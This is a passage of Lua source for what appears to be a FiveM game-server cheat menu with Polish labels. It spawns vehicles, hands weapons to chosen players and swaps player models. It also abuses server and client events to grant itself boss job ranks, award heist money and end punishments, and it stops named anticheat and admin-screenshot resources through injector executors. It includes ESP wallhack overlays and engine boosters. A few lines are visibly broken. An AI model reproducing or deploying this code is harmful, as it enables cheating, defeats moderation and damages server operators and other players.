              elseif LR.IsMenuOpened(cAoP) then
                if LR.CheckBox("~g~Zresp w srodku", spawninside, function(enabled) spawninside = enabled end) then
                elseif LR.Button("~r~Zresp pojazd") then
                  local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                  local veh = CarsArray[carTypeIdx][carToSpawn]
                  if veh == nil then
                    veh = "adder"
                  end
                  vehiclehash = GetHashKey(veh)
                  RequestModel(vehiclehash)

                  Citizen.CreateThread(function()
                  local waiting = 0
                  while not HasModelLoaded(vehiclehash) do
                    waiting = waiting + 100
                    Citizen.Wait(100)
                    if waiting > 5000 then
                      ShowNotification("~r~Nie możesz zrespić tego pojazdu.")
                      break
                    end
                  end
                  SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1))+90, 1, 0)
                  SetVehicleStrong(SpawnedCar, true)
                  SetVehicleEngineOn(SpawnedCar, true, true, false)
                  SetVehicleEngineCanDegrade(SpawnedCar, false)
                  if spawninside then
                    SetPedIntoVehicle(PlayerPedId(-1), SpawnedCar, -1)
                  end
                  end)
                end

                LR.Display()
              elseif LR.IsMenuOpened(CTSmtsps) then
                if LR.Button("~r~Zresp pojazd") then
                  local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                  local veh = Trailers[TrailerToSpawn]
                  if veh == nil then veh = "adder" end
                  vehiclehash = GetHashKey(veh)
                  RequestModel(vehiclehash)

                  Citizen.CreateThread(function()
                  local waiting = 0
                  while not HasModelLoaded(vehiclehash) do
                    waiting = waiting + 100
                    Citizen.Wait(100)
                    if waiting > 5000 then
                      ShowNotification("~r~Nie mozesz zresić tego pojazdu.")
                      break
                    end
                  end
                  local SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1))+90, 1, 0)
                  local UserCar = GetVehiclePedIsUsing(GetPlayerPed(-1))
                  AttachVehicleToTrailer(Usercar, SpawnedCar, 50.0)
                  SetVehicleStrong(SpawnedCar, true)
                  SetVehicleEngineOn(SpawnedCar, true, true, false)
                  SetVehicleEngineCanDegrade(SpawnedCar, false)
                  end)
                end

                LR.Display()
              elseif LR.IsMenuOpened(GSWP) then
                for i = 1, #allWeapons do
                  if LR.Button(allWeapons[i]) then
                    GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
                  end
                end

                LR.Display()
              elseif LR.IsMenuOpened(Ped) then
              if LR.Button("~w~Robot") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("u_m_y_juggernaut_01")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
                elseif LR.Button("~w~Gracz (mężczyzna)") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("mp_m_freemode_01")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                local pped = PlayerPedId()
                for i = 0, 7 do
                  ClearPedProp(pped, i)
                end
                for i = 0, 11 do
                  SetPedComponentVariation(pped, i, 0, 0, 0) 
                end 
                DeleteEntity(playerPed)

                elseif LR.Button("~w~Gracz (kobieta)") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("mp_f_freemode_01")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                local pped = PlayerPedId()
                for i = 0, 7 do
                  ClearPedProp(pped, i)
                end
                for i = 0, 11 do
                  SetPedComponentVariation(pped, i, 0, 0, 0) 
                end 
                DeleteEntity(playerPed)

                elseif LR.Button("~w~SWAT") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("s_m_y_swat_01")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
                elseif LR.Button("~w~Jezus") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("u_m_m_jesus_01")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
                elseif LR.Button("~w~Zombie") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("u_m_y_zombie_01")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
                elseif LR.Button("~w~Michael") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("player_zero")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
                elseif LR.Button("~w~Franklin") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("player_one")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
                elseif LR.Button("~w~Trevor") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("player_two")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
                elseif LR.Button("~w~Lekarz") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("s_m_m_doctor_01")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
                elseif LR.Button("~w~Kosmita") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("s_m_m_movalien_01")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
                elseif LR.Button("~w~Strażak") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("s_m_y_fireman_01")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
                elseif LR.Button("~w~Superman") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("u_m_y_imporage")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
                elseif LR.Button("~w~Bodybuilder") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("u_m_y_babyd")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
                elseif LR.Button("~w~FIB") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("s_m_m_fibsec_01")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
                elseif LR.Button("~w~Bigfoot") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("cs_orleans")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                local pped = PlayerPedId()
                for i = 0, 7 do
                  ClearPedProp(pped, i)
                end
                for i = 0, 11 do
                  SetPedComponentVariation(pped, i, 0, 0, 0) 
                end 
                DeleteEntity(playerPed)
              elseif LR.Button("~w~Yeti") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("U_M_M_Yeti")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                local pped = PlayerPedId()
                for i = 0, 7 do
                  ClearPedProp(pped, i)
                end
                for i = 0, 11 do
                  SetPedComponentVariation(pped, i, 0, 0, 0) 
                end 
                DeleteEntity(playerPed)
                  
              elseif LR.Button("~w~Ksiądz") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("cs_priest")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                local pped = PlayerPedId()
                for i = 0, 7 do
                  ClearPedProp(pped, i)
                end
                for i = 0, 11 do
                  SetPedComponentVariation(pped, i, 0, 0, 0) 
                end 
                DeleteEntity(playerPed)
               elseif LR.Button("~w~Szympans") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("a_c_chimp")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
               elseif LR.Button("~w~Świnia") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("a_c_pig")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
               elseif LR.Button("~w~Krowa") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("a_c_cow")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
               elseif LR.Button("~w~Szczur") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("a_c_rat")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
               elseif LR.Button("~w~Astronauta") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("U_M_Y_RSRanger_01")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
               elseif LR.Button("~w~Zając") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("a_c_rabbit_01")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
               elseif LR.Button("~w~Dzik") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("a_c_boar")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
               elseif LR.Button("~w~Mewa") then
                local playerPed = PlayerId()
                local modelHash = GetHashKey("a_c_seagull")
                if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
             end
         end
                local x, y, z = table.unpack(GetEntityCoords(playerPed))
                local h = GetEntityHeading(playerPed)
                local ped = CreatePed(4, modelHash, x, y, z, h, false, true)
                SetEntityInvincible(ped, false)
                SetEntityAsMissionEntity(ped, true, true)
                SetEntityHasGravity(ped, true)
                SetEntityCollision(ped, true, true)
                SetPedCanRagdoll(ped, true)
                SetEntityVisible(ped, true)

                SetPlayerModel(playerPed, modelHash)
                SetEntityCoordsNoOffset(playerPed, x, y, z, true, true, true)
                SetEntityHeading(playerPed, h)
                DeleteEntity(playerPed)
                end

                LR.Display()
				  elseif LR.IsMenuOpened(espaa) then
				  if LR.Button("~w~Police Job ~m~[Działa na serwerach z jobami z ESX]") then
				 TriggerEvent('esx:setJob', {name = "police", label = "Police", grade = 8, grade_name = "boss", grade_label = "discord.gg/5GMHtjKZ7F"})
				  elseif LR.Button("~w~Mechanik Job ~m~[Działa na serwerach z jobami z ESX]") then
				 TriggerEvent('esx:setJob', {name = "mecano", label = "mecano", grade = 7, grade_name = "boss", grade_label = "discord.gg/5GMHtjKZ7F"})
				  elseif LR.Button("~w~Medyk Job ~m~[Działa na serwerach z jobami z ESX]") then
				 TriggerEvent('esx:setJob', {name = "Ambulance", label = "Ambulance", grade = 9, grade_name = "boss", grade_label = "discord.gg/5GMHtjKZ7F"})
				 	elseif LR.Button("Dźwięki ~r~[W chuj prawdopodobieństwo na bana]") then
					TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 100000, "cuff", 0.5)
          elseif LR.Button("~w~Zdjęcie prac na bojówie ~m~[Na no-name bojówach działa]") then
            TriggerServerEvent('esx_communityservice:finishCommunityService')
				  elseif LR.Button("~w~NoxRP spawn brudnej ~r~[nie polecam spamić]") then
                    TriggerServerEvent("TriggerServerEvent('angelicxs-BankTruck:Server:HeistReward')")
					elseif LR.CheckBox("~m~[vMenu] ~w~Spam DM", vmenuspamdm, function(enabled) vmenuspamdm = enabled end) then
          elseif LR.Button("~m~[KlamkaGG] ~w~Rev") then
            TriggerEvent('esx_ambulancejob:revive')
          elseif LR.Button("~m~[DreamGG] ~w~Rev") then
            TriggerEvent('fineeaszkruljebacpsy:reviveson', true)
          elseif Susano then
            if LR.Button("~w~Wyłącz antycheata na NightsideRDM ~m~[SUSANO ONLY]") then
              print("Stopuje night_vehicles...")
              Susano.StopResource("night_vehicles")
              print("Zastopowano night_vehicles...")
              notify("Antycheat OFF!")
              print("Stopuje screenshot-basic...")
              Susano.StopResource("screenshot-basic")
              print("Zastopowano screenshot-basic...")
              print("Screenshoty do adminów OFF!")
            elseif LR.Button("~w~Wyłącz antytrolla na NightsideRDM ~m~[SUSANO ONLY]") then
              print("Stopuje night_core...")
              Susano.StopResource("night_core")
              print("Zastopowano night_core...")
              notify("Antytroll OFF!")
            end
          elseif MachoResourceStop then
            if LR.Button("~w~Wyłącz antycheata na NightsideRDM ~m~[MACHO ONLY]") then
              print("Stopuje night_vehicles...")
              MachoResourceStop("night_vehicles")
              print("Zastopowano night_vehicles...")
              notify("Antycheat OFF!")
              print("Stopuje screenshot-basic...")
              MachoResourceStop("screenshot-basic")
              print("Zastopowano screenshot-basic...")
              print("Screenshoty do adminów OFF!")
            elseif LR.Button("~w~Wyłącz antytrolla na NightsideRDM ~m~[MACHO ONLY]") then
              print("Stopuje night_core...")
              MachoResourceStop("night_core")
              print("Zastopowano night_core...")
              notify("Antytroll OFF!")
            end
          end
            LR.Display()
              elseif LR.IsMenuOpened(info) then
                if LR.Button("IP Serwera: "..GetCurrentServerEndpoint())then
                  notify("~w~IP Serwera: ~g~Status: "..GetCurrentServerEndpoint())
                elseif LR.Button("~g~Wyłącz ~r~Antycheaty ~o~Nie działa! ") then
                  notify("~r~ Anty Cheat off ~o~Nie działa! ")
                  print("off Anty Cheat Nie działa!")
                elseif LR.Button("~r~Ostatni Update: ~g~21/01/2026 16:34") then
                  notify("~w~Revamp UI ale za dużo zmian żeby tu się zmieścić")
                elseif LR.MenuButton("~w~Zasoby                                                                                  >", RESO) then
                elseif LR.Button("~b~Działające serwery ") then
                  notify("~w~ Wszystkie Działają ~g~Safe! ")
                end


                LR.Display()
              elseif LR.IsMenuOpened(espa) then
                if LR.CheckBox("~w~Główny przełącznik", esp, function(enabled) esp = enabled end) then
                elseif LR.CheckBox("~w~Box", espbox, function(enabled) espbox = enabled end) then
                elseif LR.CheckBox("~w~Informacje", espinfo, function(enabled) espinfo = enabled end) then
                elseif LR.CheckBox("~w~Linie", esplines, function(enabled) esplines = enabled end) then
                end

                LR.Display()
              elseif LR.IsMenuOpened(bmm) then
                if LR.ComboBox("Booster ~r~mocy ~s~silnika", powerboost, currentItemIndex, selectedItemIndex, function(currentIndex, selectedIndex)
                currentItemIndex = currentIndex
                selectedItemIndex = selectedIndex
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), selectedItemIndex * 20.0)
                end) then

                elseif LR.CheckBox("Booster ~r~mocy ~s~silnika ~g~2x", t2x, function(enabled)
                  t2x = enabled
                  t4x = false
                  t10x = false
                  t16x = false
                  tdx = false
                  tbxd = false
                  end) then
                  elseif LR.CheckBox("Booster ~r~mocy ~s~silnika~g~4x", t4x, function(enabled)
                    t2x = false
                    t4x = enabled
                    t10x = false
                    t16x = false
                    tdx = false
                    tbxd = false
                    end) then
                    elseif LR.CheckBox("Booster ~r~mocy ~s~silnika ~g~10x", t10x, function(enabled)
                      t2x = false
                      t4x = false
                      t10x = enabled
                      t16x = false
                      tdx = false
                      tbxd = false
                      end) then
                      elseif LR.CheckBox("Booster ~r~mocy ~s~silnika ~g~16x", t16x, function(enabled)
                        t2x = false
                        t4x = false
                        t10x = false
                        t16x = enabled
                        tdx = false
                        tbxd = false
                        end) then
                            end
                            LR.Display()
                          end
                          Citizen.Wait(0)
                        end
                        end)
